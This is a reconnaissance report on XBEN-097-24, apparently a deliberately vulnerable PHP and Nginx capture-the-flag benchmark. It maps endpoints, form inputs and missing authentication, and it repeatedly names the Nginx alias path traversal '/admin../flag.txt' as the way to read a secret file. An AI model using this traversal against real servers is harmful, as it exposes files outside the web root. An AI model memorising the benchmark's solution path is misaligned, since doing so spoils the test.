# Reconnaissance Deliverable: XBEN-097-24 Application

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the XBEN-097-24 application's attack surface. This is a deliberately vulnerable PHP application with critical security flaws focused on web server misconfiguration and broken authentication/authorization.

**Key Sections for Security Analysis:**
- **Section 4 (API Endpoint Inventory):** All 6 network-accessible PHP endpoints with authentication status
- **Section 5 (Potential Input Vectors):** Login and contact form inputs with validation details
- **Section 6 (Network & Interaction Map):** System architecture with trust boundaries
- **Section 7 (Role & Privilege Architecture):** Documents the complete absence of authorization controls
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized attack targets
- **Section 9 (Injection Sources):** Confirms NO SQL/Command injection vectors exist

**Priority Attack Vectors:**
1. **Nginx Path Traversal (CRITICAL):** `/admin` location misconfiguration enables `/admin../flag.txt` access
2. **Broken Authentication:** Login form is completely non-functional
3. **Broken Access Control:** Admin panel at `/admin/` has zero authorization checks
4. **No Session Management:** Application cannot maintain authentication state
5. **Unencrypted HTTP:** All credentials transmitted in cleartext

**Critical Finding:** This application's primary vulnerabilities are infrastructure-level (Nginx misconfiguration) and architectural (complete absence of authentication/authorization), NOT application-level injection flaws.

## 1. Executive Summary

XBEN-097-24 is a deliberately vulnerable PHP 7.4 web application running on Nginx 1.18.0 that presents a **critical security posture** designed as a CTF challenge. The application's architecture exhibits three catastrophic security failures:

**1. Nginx Path Traversal Misconfiguration (CVSS 7.5 - High)**
The nginx.conf file contains a textbook alias misconfiguration where the `/admin` location (without trailing slash) aliases to `/var/www/html/` instead of the intended admin directory. Combined with `autoindex on`, this enables direct traversal to the parent directory via `/admin../flag.txt`, allowing unauthorized access to the flag file stored at `/var/www/flag.txt`.

**2. Complete Absence of Authentication (CVSS 9.8 - Critical)**
The application implements zero functional authentication mechanisms despite presenting a login interface. The login.php endpoint unconditionally fails all authentication attempts by setting `$showError = true` regardless of credentials provided. No database validation exists, no session creation occurs, and the authentication system is purely cosmetic "security theater."

**3. Broken Access Control (CVSS 9.1 - Critical)**
The admin panel at `/admin/index.php` is publicly accessible without any authorization checks. The file contains only static HTML with the word "Restricted" but implements no actual restrictions - no session validation, no role checks, and no authentication requirements. Any anonymous user can access this administrative interface via direct URL access.

**Technology Stack:**
- **Frontend:** Pure HTML/CSS with no JavaScript frameworks
- **Backend:** PHP 7.4-FPM (End-of-Life since November 2022)
- **Web Server:** Nginx 1.18.0 with critical misconfiguration
- **Infrastructure:** Docker containerized, HTTP only (port 80), no HTTPS
- **Database:** None (MySQL extensions installed but unused)
- **Authentication:** None (login form non-functional)

**Attack Surface Characteristics:**
This is a minimal, file-based PHP application with 6 public endpoints, 2 form handlers (login and contact), zero session management, and no database persistence. The application's security posture is deliberately weak, with the primary vulnerability being the Nginx alias misconfiguration rather than application-layer injection flaws. All endpoints operate over unencrypted HTTP, transmitting credentials in cleartext.

**External Attacker Perspective:**
From the public internet, an attacker can immediately exploit the path traversal to retrieve the flag, enumerate the admin panel without authentication, and submit forms without CSRF protection. The application provides no resistance to reconnaissance, enumeration, or exploitation due to absent security controls at all layers.

## 2. Technology & Service Map

### Frontend Architecture
- **Framework:** None - Pure HTML5 with inline CSS
- **JavaScript:** Completely absent - no client-side scripting
- **Styling:** Single CSS file at `/style.css` (145 lines)
- **Static Assets:** 2 images (`/images/logo.png`, `/images/logo2.png`)
- **Client-Side Validation:** HTML5 attributes only (`required`, `type="email"`)
- **No SPA Framework:** No React, Vue, Angular, or client-side routing

### Backend Technology Stack
- **Language:** PHP 7.4.33 (End-of-Life - No security updates since November 2022)
- **Runtime:** PHP-FPM listening on 127.0.0.1:9000
- **Framework:** None - File-based routing with no MVC structure
- **Installed Extensions:** mysqli, pdo_mysql, mysqlnd (all unused)
- **Session Management:** Absent - no `session_start()` anywhere
- **Authentication Libraries:** None
- **Input Validation:** Only `htmlspecialchars()` for XSS prevention
- **Code Structure:** 6 standalone PHP files with no separation of concerns

### Infrastructure & Hosting
- **Web Server:** Nginx 1.18.0 (reverse proxy to PHP-FPM)
- **Containerization:** Docker with single-service architecture
- **Operating System:** Debian-based (inferred from Nginx package)
- **Network Protocol:** HTTP only on port 80 (no HTTPS/TLS)
- **CDN:** None - direct server access
- **Load Balancer:** None - single container deployment
- **Firewall:** None detected in application layer

### Database & Persistence
- **Database Type:** None deployed
- **Database Extensions Installed:** mysqli, pdo_mysql (unused)
- **Data Storage:** File-based only (`/var/www/flag.txt`)
- **Cache Layer:** None (no Redis, Memcached)
- **Session Storage:** None (no session management)
- **ORM:** None

### Identified Subdomains
Based on subfinder output from pre-recon report, the following subdomains were discovered for localhost:
- naeu2.naeuinc.localhost
- fndlync01.5ninesdata.localhost
- autodiscover.regency.localhost
- owa.regency.localhost
- server02.counterintel.localhost
- mail.localhost
- mse-ca-mail.corp.mse.localhost
- mail02.regency.localhost
- mail03.regency.localhost
- sbs.allsaintsschool.localhost
- tools.sonoma.edu.localhost
- autodiscover.localhost
- exchvm.nwcnet.localhost
- server2.hunter.localhost
- www.localhost
- mail.regency.localhost

**Note:** These subdomains are not relevant to the target application at http://localhost:40989 and appear to be artifacts of the local DNS environment.

### Open Ports & Services
Based on nmap scan from pre-recon report:

**Target Application:**
- **Port 80/tcp:** Nginx 1.18.0 (target application)
  - Service: Caddy httpd (proxy layer)
  - Status: Open
  - Purpose: Primary HTTP interface for XBEN-097-24 application

**Other Services on Host (Out of Scope):**
- Port 443/tcp: SSL/HTTPS
- Port 631/tcp: CUPS printing service
- Port 3000/tcp: Node.js Express
- Port 4444/tcp: Python SimpleHTTPServer
- Port 5000/tcp: Werkzeug (Python - Library V1)
- Port 5003/tcp: Werkzeug (Python - User List)
- Port 8080/tcp: Apache/PHP (PHPAbUsers)
- Port 8888/tcp: Unknown service
- Port 9999/tcp: HTTP service with CORS headers
- Port 49152/tcp: Golang HTTP (Tailscale)

## 3. Authentication & Session Management Flow

### Critical Finding: NO FUNCTIONAL AUTHENTICATION EXISTS

The XBEN-097-24 application presents a complete absence of authentication and session management mechanisms. While a login interface exists at `/login.php`, it is entirely non-functional and serves only as "security theater."

### Entry Points
- **Login Form:** `/login.php` (GET/POST)
  - Displays username and password fields
  - Form submits to self via POST
  - **CRITICAL:** All login attempts fail unconditionally
  
- **No Registration:** No user registration endpoint exists
- **No Password Reset:** No password recovery mechanism
- **No SSO/OAuth:** No external authentication providers
- **No API Keys:** No token-based authentication
- **No MFA:** No multi-factor authentication

### Authentication Mechanism Analysis

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/login.php`

**Non-Functional Authentication Code (Lines 23-30):**
```php
<?php
$showError = false;
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    $showError = true;  // Line 29: ALWAYS SET TO TRUE
}
?>
```

**Fatal Flaws:**
1. **No Credential Validation:** No database query, no password comparison, no credential checking
2. **Unconditional Failure:** Line 29 sets `$showError = true` for every POST request
3. **No Session Creation:** No `session_start()`, no `$_SESSION` usage
4. **No State Management:** No authentication state persisted anywhere
5. **No Redirect:** No redirect to dashboard/admin panel on "success"
6. **Input Sanitized Then Discarded:** Credentials sanitized but never used

**What Should Happen (but doesn't):**
1. Validate username/password against database
2. Create session via `session_start()`
3. Store user identity in `$_SESSION['user_id']`
4. Set authentication flag in `$_SESSION['authenticated']`
5. Store user role in `$_SESSION['role']`
6. Redirect to appropriate dashboard
7. Regenerate session ID to prevent fixation

**What Actually Happens:**
1. Accept POST data
2. Sanitize with `htmlspecialchars()`
3. Set error flag to true
4. Display "Incorrect username/password"
5. Discard all data

### Session Management: COMPLETELY ABSENT

**Comprehensive Search Results:**
- **`session_start()` calls:** 0 instances found
- **`$_SESSION` usage:** 0 instances found
- **`session_destroy()` calls:** 0 instances found
- **`session_regenerate_id()` calls:** 0 instances found
- **`session_set_cookie_params()` calls:** 0 instances found
- **`setcookie()` calls:** 0 instances found
- **`$_COOKIE` references:** 0 instances found

**Implications:**
- Cannot maintain "logged in" state
- Cannot track authenticated users
- Cannot implement "remember me" functionality
- Cannot implement proper logout
- Cannot protect against session fixation
- Cannot implement session timeouts

### Code Pointers for Authentication Implementation

**Login Form Handler:**
- File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/login.php`
- POST Processing: Lines 23-30
- Error Display: Lines 41-44
- Form Definition: Lines 32-40

**Admin Panel (Should Have Auth Check):**
- File: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/admin/index.php`
- **Lines 1-27:** Pure HTML, ZERO authorization checks
- **Missing:** Session validation at file beginning
- **Missing:** Role check before content display
- **Missing:** Redirect to login if unauthenticated

**Where Session Code SHOULD Exist:**
- At the top of admin/index.php: Session validation
- After successful login in login.php: Session creation
- In a shared include file: Authentication middleware
- **Reality:** None of this code exists

## 3.1 Role Assignment Process

### Role Determination: NOT IMPLEMENTED

**Finding:** The application has no role assignment process because it has no authentication system.

**Expected Implementation (Missing):**
- Database table storing user roles (e.g., `users.role`)
- JWT claims containing role information
- Session variable storing role (`$_SESSION['role']`)
- External service providing role data

**Actual Implementation:**
- No database exists
- No JWT implementation
- No session management
- No role storage mechanism

**Default Role:**
- Not applicable - no user system exists
- All visitors are effectively "anonymous"
- All visitors have equal access (unrestricted)

**Role Upgrade Path:**
- Not applicable - no role system exists
- No mechanism to escalate privileges
- No admin approval workflow
- No self-service role changes

**Code Implementation:**
- No role assignment code exists anywhere in the application
- No role definitions found
- No role constants or enums
- No role checking logic

## 3.2 Privilege Storage & Validation

### Storage Location: NONE

**Finding:** No privilege storage or validation mechanisms exist.

**Missing Components:**
- JWT claims for privilege storage
- Session variables for role tracking
- Database tables for user permissions
- Cookie-based privilege tokens
- External authorization service integration

**Validation Points: ABSENT**

**No Middleware Found:**
- No authentication middleware files
- No `require_once` statements for auth libraries
- No centralized auth checking

**No Decorators/Guards:**
- No function-level permission checks
- No role-based guards
- No access control decorators

**No Inline Checks:**
- Admin panel has zero authorization logic
- No `if ($_SESSION['role'] === 'admin')` statements
- No permission validation before sensitive operations

**Cache/Session Persistence:**
- Not applicable - no session management exists
- No privilege caching
- No session storage
- No session lifetime configuration

**Code Pointers:**
- Expected location: Top of `/src/app/admin/index.php` - **MISSING**
- Expected location: Shared include file - **DOES NOT EXIST**
- Expected location: Middleware directory - **DOES NOT EXIST**

## 3.3 Role Switching & Impersonation

### Impersonation Features: NONE

**Finding:** No role switching or impersonation capabilities exist because there is no role system.

**Missing Features:**
- Admin ability to view application as another user
- "Sudo mode" for temporary privilege elevation
- Role switching between different privilege levels
- Context switching for support staff

**Audit Trail:**
- Not applicable - no impersonation features exist
- No logging of role switches
- No audit trail of elevated access
- No security event logging

**Code Implementation:**
- No impersonation code exists
- No role switching logic
- No sudo mode implementation
- No privilege escalation tracking

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints listed are accessible through the target web application at http://localhost:40989. No local-only utilities, build tools, or development endpoints are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | / | anon | None | None | Landing page with static marketing content about AI security. Pure HTML with no PHP processing. File: `/src/app/index.php` (46 lines) |
| GET | /index.php | anon | None | None | Same as `/` - landing page. Direct file access. File: `/src/app/index.php` |
| GET | /home.php | anon | None | None | Simple redirect to index.php via `header("Location: index.php");`. No processing logic. File: `/src/app/home.php` line 2 |
| GET | /about.php | anon | None | None | Static informational page about AI in security. Pure HTML content. File: `/src/app/about.php` (44 lines) |
| GET | /contact.php | anon | None | None | Displays contact form with name, email, message fields. File: `/src/app/contact.php` lines 30-46 |
| POST | /contact.php | anon | None | None | **Accepts:** name, email, message via POST. **Processing:** Sanitizes with `htmlspecialchars()` (lines 25-27), displays generic success message (line 29), discards all data. **Vulnerable to:** CSRF (no token validation). File: `/src/app/contact.php` |
| GET | /login.php | anon | None | None | Displays login form with username and password fields. File: `/src/app/login.php` lines 32-40 |
| POST | /login.php | anon | None | None | **CRITICAL:** Non-functional authentication. **Accepts:** username, password. **Processing:** Sanitizes with `htmlspecialchars()` (lines 26-27), unconditionally sets `$showError = true` (line 29), always displays "Incorrect username/password" (lines 41-44). **No:** Database validation, session creation, credential checking. **Vulnerable to:** CSRF, cleartext credential transmission (HTTP only). File: `/src/app/login.php` |
| GET | /admin/ | anon | None | **NONE - CRITICAL VULNERABILITY** | **Admin panel with ZERO authorization checks.** Displays "Administrative Zone - Restricted" static HTML. Publicly accessible without authentication. Should require admin role but has no protection. File: `/src/app/admin/index.php` (26 lines, pure HTML) |
| GET | /admin/index.php | anon | None | **NONE - CRITICAL VULNERABILITY** | Same as `/admin/` - unprotected admin interface. File: `/src/app/admin/index.php` |
| GET | /admin | anon | None | **NONE - ENABLES PATH TRAVERSAL** | **CRITICAL NGINX MISCONFIGURATION:** Location without trailing slash aliases to `/var/www/html/` instead of admin directory. Enables directory listing (`autoindex on`) and path traversal via `/admin../flag.txt`. Nginx config: `/src/nginx.conf` lines 16-19 |
| GET | /style.css | anon | None | None | Static CSS stylesheet (145 lines). No processing. |
| GET | /images/logo.png | anon | None | None | Static image asset. No processing. |
| GET | /images/logo2.png | anon | None | None | Static image asset. No processing. |

### Endpoint Analysis Summary

**Total Endpoints:** 13 (6 PHP handlers, 3 static assets, 4 route aliases)
**Public Endpoints:** 13 (100%)
**Authenticated Endpoints:** 0
**Authorization-Protected Endpoints:** 0

**Endpoints by Category:**
- **Static Content:** 5 endpoints (/, /index.php, /about.php, /style.css, images)
- **Form Handlers:** 4 endpoints (/contact.php GET/POST, /login.php GET/POST)
- **Administrative:** 3 endpoints (/admin/, /admin/index.php, /admin misconfiguration)
- **Redirect:** 1 endpoint (/home.php)

**Critical Vulnerabilities:**
1. **Admin panel accessible without authentication:** /admin/, /admin/index.php
2. **Nginx path traversal:** /admin (without trailing slash)
3. **Non-functional authentication:** /login.php POST always fails
4. **CSRF vulnerabilities:** /contact.php, /login.php lack token protection
5. **Cleartext credential transmission:** All HTTP, no HTTPS

**Authorization Mechanisms Used:**
- **None:** 0 endpoints implement any authorization
- **Session-based:** 0 endpoints check sessions
- **Token-based:** 0 endpoints validate tokens
- **HTTP Basic Auth:** 0 endpoints use HTTP auth
- **Nginx auth_basic:** 0 endpoints protected by web server

**Object ID Parameters:**
- **NONE FOUND:** No endpoints accept user_id, order_id, file_id, or similar object identifiers
- **Implication:** No horizontal privilege escalation attack surface via IDOR
- **Reason:** Application has no database, no object storage, no multi-user functionality

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** All input vectors listed are accessible through the target web application's network interface at http://localhost:40989. No local-only scripts, build tools, or development utilities are included.

### URL Parameters
**Finding:** NO URL parameters accepted by the application.

- All endpoints use file-based routing with no query string processing
- No `$_GET` variable usage found in any PHP files
- No URL parameter parsing logic exists
- No search functionality, filtering, or pagination
- No redirect parameters (redirect URLs are hardcoded)

### POST Body Fields (Form Data)

#### Login Form (/login.php)
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/login.php`

**1. Username Field**
- **Parameter Name:** `username`
- **Input Source:** `$_POST['username']`
- **Code Location:** Line 26
- **Processing:** `$username = htmlspecialchars($_POST['username']);`
- **HTML Form:** Line 34 - `<input type="text" id="username" name="username" required>`
- **Validation:** Only `htmlspecialchars()` for XSS prevention
- **Missing Validation:** Length limits, format checks, type validation, database escaping
- **Attack Surface:** Input sanitized but never used; no SQL injection risk (no database)
- **CSRF Vulnerability:** Yes - no token validation

**2. Password Field**
- **Parameter Name:** `password`
- **Input Source:** `$_POST['password']`
- **Code Location:** Line 27
- **Processing:** `$password = htmlspecialchars($_POST['password']);`
- **HTML Form:** Line 37 - `<input type="password" id="password" name="password" required>`
- **Validation:** Only `htmlspecialchars()` for XSS prevention (inappropriate for passwords)
- **Missing Validation:** Password hashing, complexity requirements, length limits
- **Cleartext Transmission:** YES - sent over HTTP without encryption
- **Attack Surface:** Input sanitized but never validated; always results in authentication failure
- **CSRF Vulnerability:** Yes - no token validation

#### Contact Form (/contact.php)
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-097-24/src/app/contact.php`

**3. Name Field**
- **Parameter Name:** `name`
- **Input Source:** `$_POST['name']`
- **Code Location:** Line 25
- **Processing:** `$name = htmlspecialchars($_POST['name']);`
- **HTML Form:** Line 34 - `<input type="text" id="name" name="name" required>`
- **Validation:** Only `htmlspecialchars()` for XSS prevention
- **Missing Validation:** Length limits, format checks, trim whitespace, database escaping
- **Attack Surface:** Input sanitized then immediately discarded; no persistence
- **CSRF Vulnerability:** Yes - no token validation

**4. Email Field**
- **Parameter Name:** `email`
- **Input Source:** `$_POST['email']`
- **Code Location:** Line 26
- **Processing:** `$email = htmlspecialchars($_POST['email']);`
- **HTML Form:** Line 37 - `<input type="email" id="email" name="email" required>`
- **Client-Side Validation:** HTML5 `type="email"` (easily bypassed)
- **Server-Side Validation:** Only `htmlspecialchars()` - NO email format validation
- **Missing Validation:** `filter_var($email, FILTER_VALIDATE_EMAIL)`, sanitization, database escaping
- **Attack Surface:** Input sanitized then discarded; no email sending functionality
- **CSRF Vulnerability:** Yes - no token validation

**5. Message Field**
- **Parameter Name:** `message`
- **Input Source:** `$_POST['message']`
- **Code Location:** Line 27
- **Processing:** `$message = htmlspecialchars($_POST['message']);`
- **HTML Form:** Line 40 - `<textarea id="message" name="message" required></textarea>`
- **Validation:** Only `htmlspecialchars()` for XSS prevention
- **Missing Validation:** Length limits (CRITICAL - allows unlimited input), content filtering, trim whitespace
- **Attack Surface:** Input sanitized then discarded; potential for abuse with massive payloads
- **CSRF Vulnerability:** Yes - no token validation

### HTTP Headers
**Finding:** NO custom HTTP header processing.

- No `$_SERVER['HTTP_X_FORWARDED_FOR']` usage
- No `$_SERVER['HTTP_USER_AGENT']` processing
- No `$_SERVER['HTTP_REFERER']` checks
- No custom header parsing (`X-*` headers)
- No Authorization header validation
- No Bearer token extraction
- Standard headers used only for method detection (`$_SERVER["REQUEST_METHOD"]`)

**Headers Read (But Not User-Controllable Input Vectors):**
- `REQUEST_METHOD` - Used in login.php (line 25) and contact.php (line 24) for POST detection
- No security implications as only used for method validation

### Cookie Values
**Finding:** NO cookie usage.

- No `setcookie()` calls
- No `$_COOKIE` variable usage
- No session cookies (no session management)
- No authentication tokens in cookies
- No preference cookies
- No tracking cookies

### File Uploads
**Finding:** NO file upload functionality.

- No `$_FILES` usage
- No `move_uploaded_file()` calls
- No file upload form fields
- No multipart/form-data handling
- No file validation or processing logic

### JSON/XML Body Parsing
**Finding:** NO JSON or XML parsing.

- No `json_decode()` calls
- No `simplexml_load_string()` usage
- No XML parsing
- All forms use `application/x-www-form-urlencoded`
- No REST API with JSON payloads
- No SOAP/XML services

### Input Vector Summary Table

| Vector Type | Count | Validation Applied | Missing Critical Validation | Attack Surface |
|-------------|-------|-------------------|---------------------------|----------------|
| URL Parameters | 0 | N/A | N/A | None |
| POST Body Fields | 5 | `htmlspecialchars()` only | Length limits, format validation, type checking, CSRF tokens | Low (input discarded) |
| HTTP Headers | 0 | N/A | N/A | None |
| Cookies | 0 | N/A | N/A | None |
| File Uploads | 0 | N/A | N/A | None |
| JSON/XML | 0 | N/A | N/A | None |

### Critical Input Vector Findings

**1. All Input Properly Encoded for Output**
- Every POST parameter processed with `htmlspecialchars()`
- Prevents reflected XSS attacks
- Default encoding (no ENT_QUOTES) leaves single quotes unescaped

**2. No Input Validation Beyond XSS Prevention**
- No length limits (potential DoS via massive payloads)
- No format validation (email accepted without server-side checks)
- No type checking
- No whitelist/blacklist validation

**3. All Input Immediately Discarded**
- No database storage
- No file writing
- No email sending
- No session storage
- Input accepted but never persisted or used

**4. CSRF Protection Completely Absent**
- No anti-CSRF tokens in forms
- No token validation in POST handlers
- Forms vulnerable to cross-site request forgery

**5. Cleartext Credential Transmission**
- Username and password sent over HTTP
- No HTTPS/TLS encryption
- Credentials visible to network sniffers

## 6. Network & Interaction Map

**Network Surface Focus:** This map includes only components that are part of the deployed, network-accessible infrastructure at http://localhost:40989. Local development environments, build systems, and local-only tools are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| Public Internet | ExternAsset | Internet | N/A | Public | External users/attackers accessing the application |
| Caddy Proxy | Service | Edge | Caddy httpd | Public | Port 80 frontend proxy (from nmap scan) |
| Nginx Web Server | Service | Edge | Nginx 1.18.0 | Public, PII (credentials) | Reverse proxy with CRITICAL path traversal misconfiguration; handles all HTTP traffic |
| PHP-FPM | Service | App | PHP 7.4.33-FPM | PII, Secrets | Application runtime; processes all PHP files; EOL version with no security patches |
| XBEN-097-24 App | Service | App | PHP 7.4 (no framework) | PII (form inputs) | Main application backend; 6 PHP files; no authentication or authorization |
| Admin Panel | Service | App | PHP 7.4 | Public | Unprotected administrative interface at /admin/; static HTML with no security |
| File System | DataStore | App | Linux filesystem | Secrets | Stores flag.txt at /var/www/; exposed via Nginx misconfiguration |
| Docker Container | AdminPlane | App | Docker | Public | Single-container deployment; no orchestration; hosts Nginx + PHP-FPM |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| Caddy Proxy | Hosts: http://localhost:80; Protocol: HTTP; TLS: No; Forwards to: Nginx; Purpose: Frontend proxy layer |
| Nginx Web Server | Hosts: http://localhost:40989; Endpoints: /*, /admin, /admin/; Config: /src/nginx.conf; FastCGI: 127.0.0.1:9000; Misconfigurations: Path traversal at /admin, autoindex enabled; HTTP Only: Yes (no HTTPS) |
| PHP-FPM | Listen: 127.0.0.1:9000; Protocol: FastCGI; Version: PHP 7.4.33; Extensions: mysqli, pdo_mysql, mysqlnd (unused); Session Management: None; Authentication: None |
| XBEN-097-24 App | Endpoints: /, /home.php, /about.php, /contact.php, /login.php, /admin/; Auth: None; Session: None; Database: None; Input Validation: htmlspecialchars() only; Framework: None |
| Admin Panel | Path: /admin/, /admin/index.php; Protection: NONE; Auth Required: No; Role Required: None; Public Access: Yes; Content: Static HTML |
| File System | Flag Location: /var/www/flag.txt; Web Root: /var/www/html; Exposed Via: /admin../flag.txt; Permissions: Default container permissions |
| Docker Container | Image: php:7.4-fpm base; Services: Nginx + PHP-FPM; Ports Exposed: 80; Volumes: None; Networks: Bridge; Secrets: Flag baked into image |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| Public Internet → Caddy Proxy | HTTP | :80 / | None | Public |
| Caddy Proxy → Nginx Web Server | HTTP | :40989 /* | None | Public |
| Public Internet → Nginx Web Server | HTTP | :40989 / | None | Public |
| Public Internet → Nginx Web Server | HTTP | :40989 /login.php | None | PII (credentials in cleartext) |
| Public Internet → Nginx Web Server | HTTP | :40989 /contact.php | None | PII (name, email, message) |
| Public Internet → Nginx Web Server | HTTP | :40989 /admin/ | **NONE - CRITICAL** | Public (should require auth:admin) |
| Public Internet → Nginx Web Server | HTTP | :40989 /admin | **NONE - ENABLES PATH TRAVERSAL** | Secrets (flag.txt accessible) |
| Nginx Web Server → PHP-FPM | FastCGI | 127.0.0.1:9000 | vpc-only (localhost) | PII |
| PHP-FPM → XBEN-097-24 App | Process | Same process | None | PII |
| PHP-FPM → File System | File I/O | /var/www/html/* | None | Public |
| Nginx Web Server → File System | File I/O | /var/www/* | **NONE - PATH TRAVERSAL** | Secrets (via alias misconfiguration) |
| XBEN-097-24 App → Admin Panel | Include | /admin/index.php | **NONE - MISSING AUTH** | Public |
| Docker Container → Nginx Web Server | Process | Supervisor/init | None | Public |
| Docker Container → PHP-FPM | Process | Supervisor/init | None | PII |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | Auth | **CRITICAL: No authentication guards exist in the application** |
| auth:user | Auth | **MISSING:** Should require valid user session or Bearer token; NOT IMPLEMENTED |
| auth:admin | Auth | **MISSING:** Should require admin session or Bearer token; NOT IMPLEMENTED at /admin/ |
| ownership:user | ObjectOwnership | **NOT APPLICABLE:** No object ownership model (no database, no objects) |
| session:valid | Auth | **MISSING:** Should validate session_start() and $_SESSION data; NOT IMPLEMENTED |
| csrf:token | Protocol | **MISSING:** Should validate CSRF tokens on POST forms; NOT IMPLEMENTED |
| vpc-only | Network | Restricts communication to localhost (FastCGI: 127.0.0.1:9000) |
| http-only | Protocol | **CRITICAL VULNERABILITY:** All traffic over unencrypted HTTP; no HTTPS/TLS |
| xss:htmlspecialchars | Protocol | Applied to all POST input (login.php lines 26-27, contact.php lines 25-27) |
| path-traversal:vulnerable | Network | **CRITICAL VULNERABILITY:** Nginx /admin alias misconfiguration enables directory traversal |
| autoindex:enabled | Network | **VULNERABILITY:** Directory listing enabled at /admin location (nginx.conf line 18) |

### Network Trust Boundaries

**Boundary 1: Public Internet → Edge (Nginx)**
- **Trust Level:** Untrusted → Untrusted
- **Expected Protection:** None (HTTP public access)
- **Actual Protection:** None
- **Status:** Working as intended (no protection)

**Boundary 2: Edge (Nginx) → Application (PHP-FPM)**
- **Trust Level:** Untrusted → Untrusted
- **Expected Protection:** FastCGI on localhost only
- **Actual Protection:** Network isolation (127.0.0.1)
- **Status:** Properly isolated via localhost

**Boundary 3: Application → Admin Panel**
- **Trust Level:** Untrusted → Trusted (SHOULD BE)
- **Expected Protection:** Authentication + authorization checks
- **Actual Protection:** **NONE - CRITICAL FAILURE**
- **Status:** **BROKEN - Admin panel publicly accessible**

**Boundary 4: Application → File System (Flag)**
- **Trust Level:** Untrusted → Secrets
- **Expected Protection:** Files outside web root
- **Actual Protection:** **FAILED - Nginx alias misconfiguration**
- **Status:** **BROKEN - Path traversal enables flag access**

### Network Segmentation Analysis

**Positive Findings:**
- FastCGI communication isolated to localhost (not externally accessible)
- Single container deployment eliminates inter-service network attacks
- No external service dependencies (no attack surface expansion)

**Critical Failures:**
1. **No authentication boundary** between public users and admin panel
2. **No authorization boundary** between roles (no role system exists)
3. **No encryption boundary** (all HTTP, no HTTPS layer)
4. **Broken file system boundary** (Nginx misconfiguration exposes parent directories)

## 7. Role & Privilege Architecture

### CRITICAL FINDING: NO AUTHORIZATION ARCHITECTURE EXISTS

The XBEN-097-24 application has **zero implementation of roles, privileges, or access controls**. This section documents the complete absence of authorization mechanisms.

### 7.1 Discovered Roles

**Finding:** NO roles defined or implemented.

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anonymous | 0 (default) | Global | Implicit - all users are anonymous |
| **NO OTHER ROLES** | - | - | **No user, admin, or other roles exist** |

**Evidence of Missing Roles:**
- No role constants or enums in codebase
- No database table for roles (no database exists)
- No JWT claims for roles (no token system)
- No session variables for roles (no session management)
- No configuration files defining roles
- Admin panel name suggests "admin" role should exist, but it doesn't

**Code Search Results:**
- Searched for: "role", "admin", "user", "privilege", "permission"
- Found: Only in comments, directory names, and HTML text
- No actual role implementation detected

### 7.2 Privilege Lattice

**Finding:** No privilege hierarchy exists because no roles exist.

```
Privilege Ordering:
anonymous (everyone) → [NO OTHER LEVELS]

There is no escalation path because:
- No authentication system
- No role assignment mechanism
- No privilege levels beyond "anonymous public access"
```

**Expected Hierarchy (Not Implemented):**
```
anonymous → user → admin
```

**Actual Hierarchy:**
```
everyone has full access to everything
```

**Role Switching Mechanisms:**
- **Impersonation:** Not implemented (no users to impersonate)
- **Sudo Mode:** Not implemented (no elevated privileges exist)
- **Role Switching:** Not implemented (no roles to switch between)

### 7.3 Role Entry Points

**Finding:** All entry points are public; no role-based routing.

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anonymous (everyone) | / or /index.php | /*, /admin/*, /login.php, /contact.php, /about.php | None |

**No Authenticated Landing Pages:**
- No `/dashboard` for logged-in users
- No `/user/profile` for authenticated users
- No restricted admin dashboard
- Admin panel at `/admin/` is publicly accessible

**Route Access Control:**
- **Public Routes:** All 6 PHP files
- **Authenticated Routes:** None (authentication doesn't exist)
- **Admin Routes:** None (admin panel is public)

### 7.4 Role-to-Code Mapping

**Finding:** No role checks in any code.

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anonymous | None | None | N/A (no storage needed) |
| user | **MISSING** | **MISSING** | **NOT IMPLEMENTED** |
| admin | **MISSING** | **MISSING** | **NOT IMPLEMENTED** |

**Expected Code Locations (All Missing):**

**Admin Panel Protection (Should Exist at Line 1):**
```php
// File: /src/app/admin/index.php
// Expected at line 1 (MISSING):
<?php
session_start();
if (!isset($_SESSION['authenticated']) || $_SESSION['role'] !== 'admin') {
    header("Location: /login.php");
    exit;
}
?>
```

**Actual Code:**
```php
// File: /src/app/admin/index.php
// Actual line 1:
<!DOCTYPE html>
```
- No PHP code at all
- No session check
- No role validation
- Pure HTML with no protection

**Login Session Creation (Should Exist):**
```php
// File: /src/app/login.php  
// Expected after successful auth (MISSING):
session_start();
$_SESSION['authenticated'] = true;
$_SESSION['user_id'] = $user_id;
$_SESSION['role'] = 'admin';
session_regenerate_id(true);
```

**Actual Code:**
```php
// File: /src/app/login.php lines 23-30
// Always fails, never creates session:
$showError = true;
```

### 7.5 Authorization Implementation Analysis

**Database Layer:** ABSENT
- No users table
- No roles table
- No permissions table
- No role_assignments table
- No database connections anywhere

**Session Layer:** ABSENT
- No `session_start()` calls
- No `$_SESSION` usage
- No session-based role storage

**Token Layer:** ABSENT
- No JWT implementation
- No API tokens
- No Bearer authentication
- No OAuth/SSO integration

**Middleware Layer:** ABSENT
- No authentication middleware files
- No authorization guard classes
- No `require_once` for auth libraries
- No centralized access control

**Inline Checks:** ABSENT
- No `if (isAdmin())` statements
- No role comparisons
- No permission validation
